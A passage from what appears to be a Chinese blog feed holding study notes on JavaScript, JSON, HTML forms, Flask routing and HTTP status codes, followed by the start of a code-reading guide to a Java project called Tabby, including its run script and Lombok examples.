comment">//Rocket,Flash,Bella,Slugger</span></code></pre></li><li><p>数组元素的添加和减少</p><p>要在数组末尾添加或删除一个项目，我们可以使用 <code>push()</code> 和<code>pop()</code>。</p><p><code>unshift()</code> 和 <code>shift()</code> 从功能上与 push() 和pop() 完全相同，只是它们分别作用于数组的开始，而不是结尾。</p></li></ul><h4 id="js基础要件">Js基础要件</h4><ul><li><p><strong>函数</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 1.匿名函数</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 给匿名函数分配变量值</span><span class="token keyword">var</span> <span class="token function-variable function">myGreeting</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 3. 这段代码的作用是创建一个具有 'msgBox' 类名的 &lt;div> 元素，并将它添加到指定的父级元素中。这样可以在页面中创建一个具有特定样式和功能的消息框（或面板）。</span><span class="token keyword">const</span> panel <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>panel<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'msgBox'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>html<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>panel<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 4. 按钮被点击后再调用函数</span><span class="token keyword">const</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>btn<span class="token punctuation">.</span>onclick <span class="token operator">=</span> displayMessage<span class="token punctuation">;</span> <span class="token comment">// 没括号</span></code></pre><ul><li>不管你是先定义后调用还是<strong>先调用后定义</strong>都行，但是别忘了定义</li></ul></li></ul><h4 id="事件">事件</h4><ul><li><p><code>事件</code>是您在编程时系统内发生的动作或者发生的事情——系统会在事件出现时产生或触发某种信号，并且会提供一个自动加载某种动作（列如：运行一些代码）的机制，比如在一个机场，当跑道清理完成，飞机可以起飞时，飞行员会收到一个信号，因此他们开始起飞</p></li><li><p><code>事件处理器（事件监听器）</code></p></li><li><p><code>addEventListener（）</code></p></li><li><p>Code</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 1. 同一个监听器注册多个处理器</span><span class="token comment">// 错误</span>myElement<span class="token punctuation">.</span>onclick <span class="token operator">=</span> functionA<span class="token punctuation">;</span>myElement<span class="token punctuation">.</span>onclick <span class="token operator">=</span> functionB<span class="token punctuation">;</span><span class="token comment">// 正确</span>myElement<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> functionA<span class="token punctuation">)</span><span class="token punctuation">;</span>myElement<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> functionB<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p><code>事件对象</code></p></li></ul><h4 id="js对象基础">Js对象基础</h4><ul><li><p>code</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">name</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Smith'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token literal-property property">age</span> <span class="token operator">:</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token literal-property property">gender</span> <span class="token operator">:</span> <span class="token string">'male'</span><span class="token punctuation">,</span>  <span class="token literal-property property">interests</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'music'</span><span class="token punctuation">,</span> <span class="token string">'skiing'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token function-variable function">bio</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' is '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">' years old. He likes '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>interests<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' and '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>interests<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function-variable function">greeting</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Hi! I\'m '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>设置成员并不意味着你只能更新已经存在的属性的值，你完全可以创建新的成员，尝试以下代码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">person<span class="token punctuation">[</span><span class="token string">'eyes'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'hazel'</span>person<span class="token punctuation">.</span><span class="token function-variable function">farewell</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Bye everybody!"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token comment">// 现在你可以测试你新创建的成员</span>person<span class="token punctuation">[</span><span class="token string">'eyes'</span><span class="token punctuation">]</span>person<span class="token punctuation">.</span><span class="token function">farewell</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>JavaScript 中所有的对象都有一个内置属性，称为它的<strong>prototype</strong>（原型）。它本身是一个对象，故原型对象也会有它自己的原型，逐渐构成了<strong>原型链</strong>。原型链终止于拥有<code>null</code> 作为其原型的对象上</p><blockquote><p><strong>备注：</strong> 指向对象原型的属性并<strong>不</strong>是<code>prototype</code>。它的名字不是标准的，但实际上所有浏览器都使用 <ahref="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto"><code>__proto__</code></a>。访问对象原型的标准方法是<ahref="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf"><code>Object.getPrototypeOf()</code></a></p></blockquote></li><li><p>有个对象叫<code>Object.prototype</code>，它是最基础的原型，所有对象默认都拥有它。<code>Object.prototype</code>的原型是 <code>null</code>，所以它位于原型链的终点</p></li><li><p>属性的“遮蔽”</p></li><li><p>设置原型</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 1</span><span class="token keyword">const</span> personPrototype <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> carl <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>personPrototype<span class="token punctuation">)</span><span class="token punctuation">;</span>carl<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hello!</span><span class="token comment">// 2</span></code></pre></li><li><p>我们经常看到这种模式，即<strong>方法</strong>是在原型上定义的，但<strong>数据属性</strong>是在构造函数中定义的。这是因为方法通常对我们创建的每个对象都是一样的，而我们通常希望每个对象的数据属性都有自己的值（就像这里每个人都有不同的名字）。</p></li><li><p>JavaScript可以在没有<strong>特定的类定义</strong>的情况下创建对象</p></li><li><p><code>委派</code>而不是<code>继承</code></p><p>相对于继承来说，<code>委派</code>可以更为灵活地在许多对象之间建立联系（例如，委派模式可以在程序运行时改变、甚至完全替换委派对象</p></li></ul><h4 id="json">Json</h4><ul><li><p>Code</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"squadName"</span> <span class="token operator">:</span> <span class="token string">"Super hero squad"</span><span class="token punctuation">,</span>  <span class="token property">"homeTown"</span> <span class="token operator">:</span> <span class="token string">"Metro City"</span><span class="token punctuation">,</span>  <span class="token property">"formed"</span> <span class="token operator">:</span> <span class="token number">2016</span><span class="token punctuation">,</span>  <span class="token property">"secretBase"</span> <span class="token operator">:</span> <span class="token string">"Super tower"</span><span class="token punctuation">,</span>  <span class="token property">"active"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"members"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"name"</span> <span class="token operator">:</span> <span class="token string">"Molecule Man"</span><span class="token punctuation">,</span>      <span class="token property">"age"</span> <span class="token operator">:</span> <span class="token number">29</span><span class="token punctuation">,</span>      <span class="token property">"secretIdentity"</span> <span class="token operator">:</span> <span class="token string">"Dan Jukes"</span><span class="token punctuation">,</span>      <span class="token property">"powers"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"Radiation resistance"</span><span class="token punctuation">,</span>        <span class="token string">"Turning tiny"</span><span class="token punctuation">,</span>        <span class="token string">"Radiation blast"</span>      <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"name"</span> <span class="token operator">:</span> <span class="token string">"Madame Uppercut"</span><span class="token punctuation">,</span>      <span class="token property">"age"</span> <span class="token operator">:</span> <span class="token number">39</span><span class="token punctuation">,</span>      <span class="token property">"secretIdentity"</span> <span class="token operator">:</span> <span class="token string">"Jane Wilson"</span><span class="token punctuation">,</span>      <span class="token property">"powers"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"Million tonne punch"</span><span class="token punctuation">,</span>        <span class="token string">"Damage resistance"</span><span class="token punctuation">,</span>        <span class="token string">"Superhuman reflexes"</span>      <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"name"</span> <span class="token operator">:</span> <span class="token string">"Eternal Flame"</span><span class="token punctuation">,</span>      <span class="token property">"age"</span> <span class="token operator">:</span> <span class="token number">1000000</span><span class="token punctuation">,</span>      <span class="token property">"secretIdentity"</span> <span class="token operator">:</span> <span class="token string">"Unknown"</span><span class="token punctuation">,</span>      <span class="token property">"powers"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"Immortality"</span><span class="token punctuation">,</span>        <span class="token string">"Heat Immunity"</span><span class="token punctuation">,</span>        <span class="token string">"Inferno"</span><span class="token punctuation">,</span>        <span class="token string">"Teleportation"</span><span class="token punctuation">,</span>        <span class="token string">"Interdimensional travel"</span>      <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p><strong>Json 数组</strong></p><pre class="language-Json" data-language="Json"><code class="language-Json">[  &#123;    &quot;name&quot; : &quot;Molecule Man&quot;,    &quot;age&quot; : 29,    &quot;secretIdentity&quot; : &quot;Dan Jukes&quot;,    &quot;powers&quot; : [      &quot;Radiation resistance&quot;,      &quot;Turning tiny&quot;,      &quot;Radiation blast&quot;    ]  &#125;,  &#123;    &quot;name&quot; : &quot;Madame Uppercut&quot;,    &quot;age&quot; : 39,    &quot;secretIdentity&quot; : &quot;Jane Wilson&quot;,    &quot;powers&quot; : [      &quot;Million tonne punch&quot;,      &quot;Damage resistance&quot;,      &quot;Superhuman reflexes&quot;    ]  &#125;]</code></pre></li><li><p>JSON要求在字符串和属性名称周围使用<strong>双引号</strong>。单引号无效</p></li><li><p><a href="https://jsonlint.com/">jsonlint</a></p></li><li><p><ahref="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse"><code>parse()</code></a>:以文本字符串形式接受 JSON 对象作为参数，并返回相应的对象。</p></li><li><p><ahref="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify"><code>stringify()</code></a>:接收一个对象作为参数，返回一个对应的 JSON 字符串。</p></li></ul><h3 id="web表单">Web表单</h3><ul><li><p><code>&lt;form&gt;</code></p><ul><li><code>&lt;action&gt;</code></li><li><code>&lt;method&gt;</code></li></ul></li><li><p>Code</p><pre class="language-markup" data-language="markup"><code class="language-markup">//必须使用value属性<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>by default this element is filled with this text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li><li><p>Code</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p><code>type="password"</code>指定了输入框的类型为密码，这意味着用户输入的内容将被隐藏，以保护敏感信息。</p><p><code>id="password"</code>定义了输入框的唯一标识符，它可以用于在JavaScript中引用该元素或将其与其他元素进行关联。</p><p><code>name="user_password"</code>定义了输入框的名称，它将在提交表单时作为参数名用于标识输入框的值</p></li></ul><h4 id="发送表单数据">发送表单数据</h4><ul><li><p><code>&lt;method&gt;</code></p><ol type="1"><li>如果您需要发送一个密码(或其他敏感数据)，永远不要使用<code>GET</code>方法否则数据会在 URL栏中显示，这将非常不安全。</li><li>如果您需要发送大量的数据，那么<code>POST</code>方法是首选的，因为一些浏览器限制了URL 的大小。此外，许多服务器限制它们接受的 URL 的长度</li></ol></li><li><p>查看<code>Http</code>请求</p><ol type="1"><li>按下 F12</li><li>选择 "Network"</li><li>选择 "All"</li><li>在 "Name" 标签页选择 "foo.com"</li><li>选择 "Headers"</li></ol></li><li><p>Python版本</p><p>这个例子展示了如何使用 Python 完成同样的事情——在 web页面上显示提交的数据。 这将使用Flaskframework来呈现模板、处理表单数据提交等</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'greeting.html'</span><span class="token punctuation">,</span> say<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'say'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> to<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'to'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>解析：</strong></p><p>装饰器是一种在函数或类定义之前进行修饰或扩展的语法。在 Python中，装饰器是以 <code>@</code> 符号开头，紧跟在函数或类的定义之前。</p><p>在 Flask 中，装饰器用于将 URL 路由与相应的视图函数关联起来。它们告诉Flask 在接收到特定 URL 请求时应该执行哪个函数。装饰器函数可以使用<code>@app.route</code> 来定义路由，其中 <code>app</code> 是 Flask应用程序的实例。</p><p>路由是指确定特定 URL 请求应该由哪个函数来处理的过程。在 Web应用程序中，客户端通过访问特定的 URL发起请求，而服务器需要将这些请求映射到相应的处理函数上。路由机制就是为了实现这种映射关系。</p><p>在 Flask 中，使用 <code>@app.route</code>装饰器来定义路由。它接受一个 URL路径作为参数，并可选地指定支持的请求方法。例如：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello, World!'</span></code></pre><p>上述代码定义了一个路由，将 URL 路径 <code>'/hello'</code> 与名为<code>hello</code> 的视图函数关联起来。当客户端发起对<code>'/hello'</code> 的 GET 或 POST 请求时，Flask 会调用<code>hello</code>函数来处理该请求，并将其返回值作为响应发送给客户端。</p><p>通过使用装饰器和路由机制，可以方便地将不同的 URL请求分配给不同的处理函数，实现灵活的路由映射和请求处理。</p></li><li><p>还有许多其他的服务器端技术可以用于表单处理，包括<ahref="https://developer.mozilla.org/zh-CN/docs/Web">Perl</a>、<ahref="https://developer.mozilla.org/zh-CN/docs/Web">Java</a>、 <ahref="https://www.microsoft.com/net">.Net</a>、<ahref="https://developer.mozilla.org/zh-CN/docs/Web">Ruby</a>等。只挑你最喜欢的用就好。话虽如此，但值得注意的是，直接使用这些技术并不常见，因为这可能很棘手。更常见的是使用许多优秀的框架，这些框架使处理表单变得更容易，例如：</p><ul><li><ahref="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Django">Django</a>for Python（比<ahref="http://flask.pocoo.org/">Flask</a>要重量级一些，但是有更多的工具和选项。）</li><li><ahref="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs">Express</a>for Node.js</li><li><a href="https://laravel.com/">Laravel</a> for PHP</li><li><a href="https://rubyonrails.org/">Ruby On Rails</a> for Ruby</li><li><a href="https://phoenixframework.org/">Phoenix</a> for Elixir</li></ul></li><li><p><code>CSRF</code> 攻击类似于 <code>XSS</code>攻击，因为它们以相同的方式开始攻击——向 Web页面中注入客户端脚本——但它们的目标是不同的。CSRF攻击者试图将权限升级到特权用户 (比如站点管理员)的级别，以执行他们不应该执行的操作(例如，将数据发送给一个不受信任的用户)。</p><p>XSS 攻击利用用户对 web 站点的信任，而 CSRF攻击则利用网站对其用户的信</p></li></ul><h4 id="使用js发送表单">使用Js发送表单</h4><ul><li><p><code>XMLHttpRequest</code>（XHR）对象用于与服务器交互。通过XMLHttpRequest 可以在不刷新页面的情况下请求特定URL，获取数据。这允许网页在不影响用户操作的情况下，更新页面的局部内容。<code>XMLHttpRequest</code>在 <ahref="https://developer.mozilla.org/zh-CN/docs/Glossary/AJAX">AJAX</a>编程中被大量使用。</p><p>尽管名称如此，<code>XMLHttpRequest</code>可以用于获取任何类型的数据，而不仅仅是 XML。它甚至支持 <ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP">HTTP</a>以外的协议（包括 file:// 和FTP），尽管可能受到更多出于安全等原因的限制。</p></li><li><p>跨域请求是指在浏览器中，当网页所在的域名、协议或端口与请求目标的域名、协议或端口不一致时，发起的网络请求。跨域请求是出于安全考虑而被浏览器实施的一种安全策略，称为同源策略（Same-OriginPolicy）。</p><p>同源策略限制了通过脚本发起的跨域请求，例如使用 XMLHttpRequest 或FetchAPI。这意味着网页只能向同一域名下的接口发起请求，而不能直接向其他域名的接口发送请求。</p><p>要实现跨域请求，可以采用以下几种常见的方法：</p><ol type="1"><li><p>JSONP（JSON with Padding）：通过动态创建<code>&lt;script&gt;</code>标签，将请求的数据作为回调函数的参数返回，实现跨域数据传输。</p></li><li><p>CORS（Cross-Origin ResourceSharing）：在服务器端设置响应头部，允许跨域请求。服务器端通过设置<code>Access-Control-Allow-Origin</code>头部字段来指定允许的源。</p></li><li><p>代理服务器：在同一域名下设置代理服务器，将跨域请求发送到代理服务器，再由代理服务器转发请求并返回响应。</p></li><li><p>WebSocket：WebSocket协议允许浏览器与服务器之间建立持久化的连接，不受同源策略限制。</p></li></ol><p>以上是一些常见的跨域请求解决方案，具体选择哪种方法取决于应用场景和需求。需要注意的是，跨域请求可能存在安全风险，因此在实施时需要谨慎考虑并遵循安全最佳实践。</p></li></ul><h3 id="补充">补充</h3><ul><li><p>What happens when you type in a <strong>URL in an Address bar ina browser</strong><imgsrc="https://s2.loli.net/2023/08/01/eTZSxRy9rIHfOkw.jpg"alt="F2S3aTOXsAA4Gb2" /></p></li><li><p><strong>HTTP请求</strong>的响应状态码是一个三位数的数字，用于表示请求的处理结果。以下是一些常见的HTTP响应状态码及其含义：</p><ul><li><p>1xx（信息性状态码）：表示请求已被接收，继续处理。</p></li><li><p>2xx（成功状态码）：表示请求已成功处理和接受。</p><ul><li>200 OK：请求成功，正常返回请求的内容。</li><li>201 Created：请求成功，并在服务器上创建了新资源。</li><li>204 No Content：请求成功，但响应没有返回内容。</li></ul></li><li><p>3xx（重定向状态码）：表示需要进一步操作以完成请求。</p><ul><li>301 Moved Permanently：请求的资源已永久移动到新位置。</li><li>302 Found：请求的资源暂时移动到新位置。</li><li>304 Not Modified：客户端的缓存副本是最新的，无需重新传输。</li></ul></li><li><p>4xx（客户端错误状态码）：表示客户端发送了错误的请求。</p><ul><li>400 Bad Request：服务器无法理解请求的语法或参数。</li><li>401 Unauthorized：请求要求身份验证，需要提供有效的凭据。</li><li>404 Not Found：请求的资源不存在。</li></ul></li><li><p>5xx（服务器错误状态码）：表示服务器在处理请求时发生了错误。</p><ul><li>500 Internal Server Error：服务器遇到了意外错误，无法完成请求。</li><li>503 ServiceUnavailable：服务器暂时无法处理请求，通常是由于过载或维护。</li></ul></li></ul><p>这些状态码可以帮助客户端了解请求的结果，并采取相应的操作。一般来说，2xx表示成功，3xx表示重定向，4xx表示客户端错误，5xx表示服务器错误。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Programming Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Project:Tabby</title>
      <link href="/2023/12/09/tabby-fen-xi/"/>
      <url>/2023/12/09/tabby-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="开始">开始</h3><ol type="1"><li><strong>运行方式</strong>:<ul><li>可以先看下run.sh脚本,理解如何运行这个项目</li><li>找到主类App的main方法作为入口,看它的主要流程</li></ul></li><li><strong>配置文件</strong>:<ul><li>resources/application.properties 中有许多配置项</li><li>config包下的配置类,看怎么加载和使用这些配置</li></ul></li><li><strong>分析流程</strong>:<ul><li>从<code>Analyser</code>类开始看起,它作为分析器主类</li><li>以<code>CallGraphScanner</code>为例,看它的scan方法主要流程</li><li>追踪信息收集器collector的作用</li><li>看数据类如Context的作用</li></ul></li><li><strong>规则配置</strong>:<ul><li>rules文件夹下配置了各种规则</li><li>找到这些规则如何应用到分析结果中</li></ul></li><li><strong>数据存储</strong>:<ul><li>dal包处理了缓存和数据库相关逻辑</li><li>看数据如何保存到Neo4j数据库中</li></ul></li><li><strong>工具类作用</strong>:<ul><li>util包下有很多工具类,逐一看下功能</li></ul></li><li><strong>测试用例</strong>:<ul><li>看AppTests的测试方法</li></ul></li></ol><h3 id="run.sh">run.sh</h3><ol type="1"><li><p>Code</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$1</span> <span class="token operator">=</span> <span class="token string">'clean'</span> <span class="token punctuation">]</span><span class="token keyword">then</span><span class="token comment"># 脚本的第一个参数（$1）是否等于'clean'。</span><span class="token builtin class-name">echo</span> <span class="token string">"clean old data"</span><span class="token comment"># 删除cache目录下的所有.db文件</span><span class="token comment"># 列出cache目录下的所有文件，并使用grep命令搜索包含graphdb的行。这可能是为了验证.db文件已被删除</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> cache/*.db <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> <span class="token parameter variable">-alh</span> cache <span class="token operator">|</span> <span class="token function">grep</span> graphdb<span class="token comment"># 列出rules目录下的所有文件</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> rules/ignores.json <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> <span class="token parameter variable">-alh</span> rules <span class="token operator">|</span> <span class="token function">grep</span> ignores<span class="token comment"># 结束if语句</span><span class="token keyword">fi</span><span class="token builtin class-name">echo</span> <span class="token string">"start to run tabby"</span><span class="token comment"># 使用最大10GB的堆内存运行</span><span class="token function">java</span> <span class="token parameter variable">-Xmx10g</span> <span class="token parameter variable">-jar</span> tabby.jar</code></pre></li></ol><h3 id="app.java">App.java</h3><ol type="1"><li><p>项目结构<imgsrc="https://s2.loli.net/2023/10/28/ikjKbuPlZFvzxN2.png"alt="image-20231028224851589" /></p></li><li><p>Lombok 是一个 Java 库，它通过使用注解来自动插入 Java代码，从而减少开发人员需要编写的样板代码量。这有助于简化代码，提高开发效率。以下是一些常用的Lombok 注解：</p><ol type="1"><li><p><strong><span class="citation" data-cites="Getter">@Getter</span>/ <span class="citation" data-cites="Setter">@Setter</span></strong>:自动生成属性的 getter 和 setter 方法。</p><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Getter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Setter</span></span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Getter</span> <span class="token annotation punctuation">@Setter</span> <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Getter</span> <span class="token annotation punctuation">@Setter</span> <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p><strong><span class="citation"data-cites="Data">@Data</span></strong>: 自动生成类中所有属性的getter、setter、<code>equals</code>、<code>hashCode</code> 和<code>toString</code> 方法。</p><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> 